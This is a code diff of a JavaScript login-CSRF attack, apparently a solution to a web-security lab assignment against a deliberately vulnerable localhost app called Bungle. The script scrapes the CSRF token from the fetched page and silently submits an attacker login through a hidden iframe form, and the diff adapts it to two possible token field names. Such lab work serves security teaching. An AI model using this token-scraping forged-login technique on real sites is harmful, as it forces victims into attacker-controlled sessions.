@@ -23,11 +23,19 @@
 				form.appendChild(field);
 			}
 
+			var pageUrl = "http://localhost/project2/?csrfdefense=1&xssdefense=0";
 			var loginUrl = "http://localhost/project2/login?csrfdefense=1&xssdefense=0";
 
-			// Loading the form sets Bungle's csrf cookie and exposes its matching hidden token.
-			$("html").load(loginUrl, function () {
-				var csrfToken = $("input[name=csrf]").val();
+			// The root page contains the login form and sets the matching CSRF cookie.
+			$.get(pageUrl, function (pageHtml) {
+				var pageContainer = document.createElement("div");
+
+				pageContainer.innerHTML = pageHtml;
+				var csrfField = $(pageContainer)
+					.find("input[name=csrf], input[name=csrf_token]")
+					.first();
+				var csrfToken = csrfField.val();
+				var csrfFieldName = csrfField.attr("name");
 				var loginFrame = document.createElement("iframe");
 				var loginForm = document.createElement("form");
 
@@ -41,7 +49,7 @@
 
 				addField(loginForm, "username", "attacker");
 				addField(loginForm, "password", "badguy4");
-				addField(loginForm, "csrf", csrfToken);
+				addField(loginForm, csrfFieldName, csrfToken);
 				document.body.appendChild(loginForm);
 				loginForm.submit();
 			});
